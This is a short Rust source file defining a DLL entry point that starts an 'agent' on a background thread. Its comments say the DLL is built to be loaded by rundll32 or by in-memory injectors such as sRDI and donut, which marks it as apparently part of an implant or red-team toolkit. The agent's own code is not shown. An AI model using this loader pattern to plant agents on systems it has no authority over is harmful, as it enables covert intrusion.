// client_dll/src/lib.rs
//
// DLL entry point for the agent. This crate builds as a cdylib (see its
// Cargo.toml), so cargo links a real PE DLL: the PE entry point is the
// CRT's DllMainCRTStartup (which forwards here) and the export table
// carries the DllMain name. Both load paths therefore work:
//
//   - rundll32.exe agent.dll,DllMain   (calls the DllMain export by name)
//   - sRDI / donut / LoadLibrary       (call the PE entry point, which
//                                       reaches DllMain with
//                                       DLL_PROCESS_ATTACH)
//
// DllMain spawns the agent on a new thread and returns TRUE immediately,
// so the host's loader lock is never held while the agent runs.

#[cfg(target_os = "windows")]
use std::ffi::c_void;

#[cfg(target_os = "windows")]
#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _h_instance: *mut c_void,
    dw_reason: u32,
    _lp_reserved: *mut c_void,
) -> i32 {
    const DLL_PROCESS_ATTACH: u32 = 1;
    if dw_reason == DLL_PROCESS_ATTACH {
        std::thread::spawn(|| {
            let rt = match tokio::runtime::Runtime::new() {
                Ok(rt) => rt,
                Err(_) => return,
            };
            rt.block_on(async {
                let _ = rcm::agent::run().await;
            });
        });
    }
    1 // TRUE
}
